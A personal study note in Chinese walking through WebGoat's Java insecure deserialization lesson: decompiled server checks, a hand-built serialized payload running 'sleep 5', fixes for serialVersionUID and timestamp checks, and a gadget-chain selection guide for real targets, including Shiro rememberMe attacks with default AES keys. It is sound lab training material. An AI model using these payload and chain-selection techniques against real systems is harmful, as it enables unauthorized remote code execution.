# 2026-08-11 Java 反序列化实战:WebGoat 手动构造 + 选链思路

> 上午学了理论(入门篇),晚上用 WebGoat 实战打通:手动构造 payload → 类型检查绕过 → 依赖选链 → Windows 踩坑。这篇是"动手记录"。

---

## 一、题目(我的理解)

WebGoat 的 Insecure Deserialization 课程:输入框接收 Base64 序列化对象并反序列化,要求**让页面响应延迟恰好 5 秒**。

给的原 payload 解码后只是一个 `java.lang.String` 对象:

```
rO0ABXQAVk...  → AC ED 00 05 + 0x74(TC_STRING) + "If you deserialize me down..."
```

**本质**:要构造一个"有机关的快递盒" —— 让服务端反序列化时自动执行命令。

## 二、服务端代码分析(关键!)

我把靶场 jar 拷出来反编译,看到服务端逻辑:

```java
Object obj = ois.readObject();                    // 反序列化
if (obj instanceof VulnerableTaskHolder) {        // ← 类型检查!
    long start = currentTimeMillis();
    // ... 反序列化执行命令 ...
    long elapsed = currentTimeMillis() - start;
    if (elapsed > 7000)  → failed(太慢也不行!)
    if (elapsed >= 3000) → 通过(3~7秒都算过)
} else if (obj instanceof String) {
    → "别用字符串"
} else {
    → "wrong object"
}
```

**两个关键发现**:
1. **类型检查**:必须是 `org.dummy.insecure.framework.VulnerableTaskHolder` 类 → ysoserial 的通用链(CC6 等)全被卡死
2. **时间判定**:3~7 秒都算过,"恰好 5 秒" = `sleep 5`

### 目标类的 readObject()

```java
public class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = 2L;   // ← 必须是 2!
    private String taskName;
    private String taskAction;                          // ← 会被执行!
    private LocalDateTime requestedExecutionTime;

    private void readObject(ObjectInputStream stream) throws Exception {
        stream.defaultReadObject();
        // 时间校验: requestedExecutionTime 太旧(10分钟前)或未来 → 抛 "outdated"
        if (requestedExecutionTime != null) {
            if (requestedExecutionTime.isBefore(now.minusMinutes(10))
                || requestedExecutionTime.isAfter(now)) {
                throw new IllegalArgumentException("outdated");
            }
        }
        Runtime.getRuntime().exec(taskAction);   // ← 命令执行点
    }
}
```

## 三、踩坑记录(全是实战教训)

### 坑 1:serialVersionUID 不匹配 ❌

第一次用 `serialVersionUID = 1L` 构造 → 报"序列化 ID 不匹配"。

**原因**:目标类的 UID 是 `2`(反编译/反射确认),不是示例代码里的 1。UID 不一致,反序列化直接 `InvalidClassException`。

**解决**:`serialVersionUID = 2L`。**验证方法**:反射读真实类的 UID,或对比 payload 里 UID 字段字节(`AAAAAAAAAAI` = 2)。

### 坑 2:时间戳过期 ❌

第二次 UID 对了,但报"该任务在接下来的十分钟内无法执行"。

**原因**:构造函数里 `requestedExecutionTime = LocalDateTime.now()`,是**我生成 payload 的时刻**。提交时如果超过 10 分钟,时间戳就"过期"了。

**解决**:构造时把 `requestedExecutionTime` 设为 **null** —— 反编译显示 `if (requestedExecutionTime != null)` 才做校验,null 直接跳过 → **永不过期**。

```java
this.requestedExecutionTime = null;   // 关键: null 跳过时间检查
```

### 坑 3:Windows 下 base64 乱码 ❌

生成 payload 后拿去 base64 编码,结果乱码。

**原因**:payload.bin 是二进制,Windows 的 `type` / 剪贴板 / 管道会当文本处理,损坏字节。

**解决**:按字节读文件:
```bash
base64 -w0 payload.bin        # git bash 直接读文件(推荐)
# PowerShell: [Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.bin"))
# Python:     base64.b64encode(open('payload.bin','rb').read())
```

**验证**:`echo "base64" | base64 -d | cmp - payload.bin` 无差异 = 无损。

## 四、手动构造的完整理解(Java 序列化格式)

```
AC ED 00 05                 魔数 + 版本(Java 序列化标识)
73                          0x73 = TC_OBJECT(对象开始)
72                          0x72 = TC_CLASSDESC(类描述符)
00 31                       类名长度 = 49
"org.dummy.insecure.framework.VulnerableTaskHolder"   类名
00 00 00 00 00 00 00 02     serialVersionUID = 2(8字节大端)
02                          classDescFlags = SC_SERIALIZABLE
00 03                       字段数 = 3
4C "requestedExecutionTime" 74 0019 "Ljava/time/LocalDateTime;"  字段1
4C "taskAction"             74 0012 "Ljava/lang/String;"         字段2
4C "taskName"               74 0012 "Ljava/lang/String;"         字段3
78                          0x78 = TC_ENDBLOCKDATA(类描述符结束)
70                          0x70 = TC_NULL(requestedExecutionTime = null)
74 0007 "sleep 5"           taskAction = "sleep 5"
74 0005 "delay"             taskName = "delay"
```

**理解要点**:
- 对象类型字段(`L`)后面跟的是 TC_STRING + 类签名(如 `"Ljava/lang/String;"`),不是 2 字节引用 —— 这是我解析时踩的坑
- 字段数据区**按字段声明顺序**依次写值
- `70`(TC_NULL)表示引用类型字段为 null

## 五、选链思路(真实场景的核心)

**规律:选什么链 = 看目标 classpath 里有什么第三方库。**

| 链名 | 需要目标有的依赖 | 常见场景 |
|------|-----------------|---------|
| URLDNS | 无(纯 JDK) | **万能探测**,无害 |
| CommonsCollections1~7 | commons-collections | 老 Java Web 应用 |
| CommonsBeanutils1 | commons-beanutils | Shiro 老版本 |
| Groovy1 | groovy | 用了 Groovy 的应用 |
| Spring1/2 | spring-core/bean | Spring 应用 |
| Jdk7u21 | 无(纯 JDK) | JDK 7u21 及以下 |
| 定制类/类型检查 | 目标特有类 | 像 WebGoat 这关,只能自己写生成器 |

**实战决策树**:
```
有反序列化入口?
  ├─ URLDNS 探测(纯JDK无害) → 确认能反序列化
  ├─ 识别依赖(报错/指纹/头信息/pom.xml)
  │    ├─ commons-collections → CC1~7
  │    ├─ commons-beanutils  → CommonsBeanutils1
  │    ├─ 纯JDK → Jdk7u21
  │    └─ 定制类/类型检查 → 自己写生成器
  └─ Shiro 特殊: payload 还要 AES 默认密钥加密
       (rememberMe Cookie: 加密后 base64, 响应头 deleteMe 特征)
```

**识别依赖的方法**:
1. 报错信息(ClassNotFoundException 泄露类名/包名)
2. 响应头/框架指纹(Shiro: rememberMe=deleteMe; Spring: 特定头)
3. 前端资源/文档/CVE 指纹
4. 拿到 jar/源码 → 直接看 pom.xml / lib 目录

## 六、我的总结

| 要点 | 一句话 |
|------|--------|
| 类型检查 | 服务端 `instanceof` 卡死通用链 → 定制类只能自己构造 |
| UID 匹配 | serialVersionUID 必须和目标类一致(反射/反编译确认) |
| 时间戳坑 | 生成时刻的时间戳会过期 → 置 null 永不过期 |
| Windows 乱码 | base64 必须按字节读文件,不能走文本管道 |
| 选链核心 | 依赖决定链 —— 先识别目标库,再选对应链 |
| Shiro 特例 | payload 要 AES 默认密钥加密再放 Cookie |

## 关联笔记

- [Java 反序列化入门](./2026-08-11-Java反序列化入门.md) — 上午理论篇:格式/readObject/Gadget Chain 概念
- [PHP 反序列化入门](./2026-08-10-PHP反序列化入门.md) — PHP `__destruct` 和 Java `readObject` 思路完全对应
- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) — 命令执行/文件操作是反序列化链的常见终点

## 待实践

- [x] CTF/靶场完整走一遍 Java 反序列化(WebGoat Insecure Deserialization 过关 ✅)
- [ ] 搭一个带 CC 依赖的 Java 应用,用 ysoserial CC6 打一次(对比 WebGoat 的类型检查)
- [ ] Shiro 靶场:URLDNS 探测 → CC/Beanutils 选链 → 默认密钥 AES 加密 → 打 rememberMe
- [ ] 用 SerializationDumper 完整解析一个 payload,和我的手动解析对照
- [ ] 试试 JDK 版本对链的影响(Jdk7u21 vs CC 链在不同 JDK 上的行为)

> ⚠️ 声明:以上技术仅用于 CTF 竞赛和授权靶场环境。
